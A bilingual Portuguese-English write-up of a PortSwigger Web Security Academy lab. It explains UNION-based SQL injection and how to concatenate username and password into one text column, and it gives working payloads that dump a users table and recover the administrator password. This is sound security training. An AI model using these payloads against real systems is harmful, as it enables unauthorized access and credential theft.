# Lab 10 — UNION Attack: Retrieving Multiple Values in a Single Column

> 🇧🇷 [Português](#-português) · 🇺🇸 [English](#-english)

---

## 🇧🇷 Português

**Plataforma:** PortSwigger Web Security Academy  
**Categoria:** SQL Injection — UNION Attack  
**Dificuldade:** 🟡 Practitioner  
**Data:** 2026-06-07

### Descrição

Mesmo objetivo do lab anterior, mas desta vez apenas uma das colunas retornadas aceita texto. O desafio é exfiltrar `username` e `password` — dois campos — usando uma única coluna disponível.

### Conceito

Quando só há uma coluna de texto disponível, a solução é **concatenar** os valores em uma única string antes de retorná-los. A sintaxe de concatenação varia por banco:

| Banco | Concatenação |
|-------|-------------|
| Oracle / PostgreSQL | `valor1 \|\| 'sep' \|\| valor2` |
| MySQL | `CONCAT(valor1, 'sep', valor2)` |
| MSSQL | `valor1 + 'sep' + valor2` |

O separador (`~`, `:`  ou qualquer caractere incomum nos dados) é usado para distinguir os campos na saída.

### Reconhecimento

Confirmação: a query retorna duas colunas, mas apenas a segunda aceita texto:

```
'+UNION+SELECT+NULL,'abc'--
```

Sem erro — apenas a coluna 2 é utilizável.

### Exploração

Username e password são concatenados com `~` como separador:

```
'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
```

A resposta retornou todas as credenciais no formato `usuario~senha`. A senha do `administrator` foi extraída e usada para login.

### O que aprendi

- Concatenação é a solução quando há menos colunas de texto do que campos a exfiltrar
- Escolher um separador que não apareça nos dados (`~`, `|`, `:::`) facilita o parsing da saída
- `||` é o operador de concatenação no Oracle e PostgreSQL — MySQL usa `CONCAT()`

### Referências

- [PortSwigger — UNION Attacks](https://portswigger.net/web-security/sql-injection/union-attacks)
- [PortSwigger — SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

---

## 🇺🇸 English

**Platform:** PortSwigger Web Security Academy  
**Category:** SQL Injection — UNION Attack  
**Difficulty:** 🟡 Practitioner  
**Date:** 2026-06-07

### Description

Same goal as the previous lab, but this time only one of the returned columns accepts text. The challenge is to exfiltrate both `username` and `password` — two fields — using only one available column.

### Concept

When only one text column is available, the solution is to **concatenate** the values into a single string before returning them. Concatenation syntax varies by database:

| Database | Concatenation |
|----------|--------------|
| Oracle / PostgreSQL | `value1 \|\| 'sep' \|\| value2` |
| MySQL | `CONCAT(value1, 'sep', value2)` |
| MSSQL | `value1 + 'sep' + value2` |

The separator (`~`, `:` or any character uncommon in the data) is used to distinguish fields in the output.

### Reconnaissance

Confirmation: the query returns two columns, but only the second accepts text:

```
'+UNION+SELECT+NULL,'abc'--
```

No error — only column 2 is usable.

### Exploitation

Username and password are concatenated with `~` as separator:

```
'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
```

The response returned all credentials in the format `user~password`. The `administrator` password was extracted and used for login.

### What I learned

- Concatenation is the solution when there are fewer text columns than fields to exfiltrate
- Choosing a separator that doesn't appear in the data (`~`, `|`, `:::`) makes output parsing easier
- `||` is the concatenation operator in Oracle and PostgreSQL — MySQL uses `CONCAT()`

### References

- [PortSwigger — UNION Attacks](https://portswigger.net/web-security/sql-injection/union-attacks)
- [PortSwigger — SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
